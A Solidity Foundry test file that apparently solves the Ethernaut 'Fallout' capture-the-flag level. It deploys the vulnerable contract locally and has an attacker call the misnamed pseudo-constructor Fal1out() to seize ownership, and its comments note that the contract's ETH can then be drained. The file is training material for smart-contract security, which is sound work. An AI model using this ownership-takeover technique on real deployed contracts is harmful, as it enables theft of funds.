// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

// Fallout.sol is Solidity ^0.6, so we cannot import it into this ^0.8 test.
// Use an interface + deployCode to talk to the compiled Fallout bytecode.
interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address payable);
    function allocate() external payable;
    function sendAllocation(address payable allocator) external;
    function collectAllocations() external;
    function allocatorBalance(address allocator) external view returns (uint256);
}

contract FalloutTest is Test {
    IFallout public target;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy Fallout. Note: there is NO real constructor that sets owner.
        vm.startPrank(deployer);
        target = IFallout(deployCode("src/Fallout.sol:Fallout"));
        vm.stopPrank();

        // Put some ETH in the contract (optional loot to drain as owner).
        vm.deal(address(target), 1 ether);

        // Give the attacker ETH (optional for this level).
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        // Win condition:
        //   attacker becomes owner
        //
        // Hints (look at Fallout.sol carefully):
        //   - The comment says "constructor", but the function name is Fal1out (digit "1")
        //   - In Solidity ^0.6, constructors must use `constructor()`, not a function
        //     matching the contract name — so Fal1out() is a normal public function
        //   - Anyone can call Fal1out() and become owner (ETH is optional)
        //
        // After you own it, you can also call collectAllocations() to drain ETH.

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        target.Fal1out();
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(target.owner(), attacker, "attacker should be owner");
    }
}
